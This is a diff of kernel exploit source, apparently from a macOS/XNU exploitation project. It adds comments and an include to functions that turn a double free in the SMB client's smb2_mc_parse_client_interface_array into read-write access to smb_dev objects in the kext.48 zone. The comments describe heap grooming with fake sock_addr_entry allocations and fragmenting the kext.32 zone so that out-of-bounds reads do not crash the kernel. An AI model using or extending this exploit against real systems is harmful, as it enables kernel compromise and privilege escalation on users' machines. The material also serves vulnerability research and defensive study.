@@ -19,6 +19,8 @@
 #include <xe/util/assert.h>
 #include <xe/xnu/proc.h>
 
+#include <smbfs/kext.h>
+
 #include "memory/allocator_rw.h"
 #include "memory/allocator_nrnw.h"
 #include "memory/zkext_alloc_small.h"
@@ -90,6 +92,20 @@ struct smb_dev_rw {
 };
 
 
+// Build a fake socket address which can be used to construct a fake sock_addr_entry
+// NOTE: The layout of `struct sock_addr_entry` is as follows
+//
+// struct sock_addr_entry {
+//   struct sockaddr* addr;
+//   TAILQ_ENTRY(sock_addr_entry) next;
+// };
+//
+// The fake sock_addr_entry is allocated using `kmem_zkext_alloc_small` which allocates provided
+// data as a socket address. This means that the first byte in allocated data will always be the
+// size of allocation. Since we want to acheive read write on smb_dev which is allocated on kext.48
+// zone, we want the fake sock_addr_entry and fake socket_address to be allocated on kext.48 zone.
+// 
+//
 struct kmem_zkext_alloc_small_entry smb_dev_rw_alloc_sock_addr(const struct sockaddr_in* smb_addr, kmem_allocator_nrnw_t nrnw_allocator) {
     for (int i=0; i<MAX_SOCK_ADDR_ALLOC_TRIES; i++) {
         struct kmem_zkext_alloc_small_entry entry = kmem_zkext_alloc_small(smb_addr, 48, AF_INET, NULL, 0);
@@ -218,8 +234,12 @@ struct smb_dev_rw* smb_dev_rw_create_from_capture(const struct sockaddr_in* smb_
 }
 
 
+// Exploit double free vulnerability in `smb2_mc_parse_client_interface_array` to achieve
+// read write access to smb dev (`struct smb_dev`) in kext.48 zone
 void smb_dev_rw_create(const struct sockaddr_in* smb_addr, smb_dev_rw_t* dev1_p, smb_dev_rw_t* dev2_p) {
     kmem_allocator_nrnw_t nrnw_allocator = kmem_allocator_nrnw_create(smb_addr);
+    
+    /// Make sure OOB reads in kext.32 zone will not cause kernel data abort
     smb_dev_rw_fragment_kext_32(smb_addr, nrnw_allocator);
     
     struct kmem_zkext_alloc_small_entry saddr_alloc = smb_dev_rw_alloc_sock_addr(smb_addr, nrnw_allocator);
